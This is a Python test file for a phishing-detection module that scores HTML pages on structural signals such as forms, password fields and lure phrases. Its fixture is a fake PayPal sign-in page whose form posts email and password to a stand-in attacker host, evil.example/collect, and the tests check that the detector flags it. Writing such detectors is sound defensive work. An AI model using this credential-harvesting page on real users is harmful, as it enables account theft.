"""Tests for compact HTML structure signal extraction."""

from pathlib import Path

from src.app_v1.html_structure_signals import extract_html_structure_signals


def test_html_structure_extracts_compact_fields(tmp_path: Path) -> None:
    html = """
    <html>
      <head><title>PayPal Security Check</title></head>
      <body>
        <form action="https://evil.example/collect">
          <input type="email" name="email" placeholder="Email" />
          <input type="password" name="pass" placeholder="Password" />
          <button type="submit">Sign in</button>
        </form>
        <p>Please verify account due to unusual activity.</p>
      </body>
    </html>
    """
    p = tmp_path / "page.html"
    p.write_text(html, encoding="utf-8")
    out = extract_html_structure_signals(
        html_path=str(p),
        final_url="https://safe.example/login",
        input_url="https://safe.example/login",
    )
    s = out["html_structure_summary"]
    assert s is not None
    assert s["form_count"] == 1
    assert s["password_input_count"] == 1
    assert s["cross_domain_form_action"] is True
    assert "verify account" in s["suspicious_phrase_hits"]
    assert isinstance(out["html_structure_risk_score"], float)
    assert out["html_structure_risk_score"] > 0.2


def test_html_structure_missing_file_graceful() -> None:
    out = extract_html_structure_signals(html_path="Z:/no/such/file.html", input_url="https://example.com")
    assert out["html_structure_summary"] is None
    assert out["html_structure_error"] in {"html_path_not_found", "missing_html_path"}
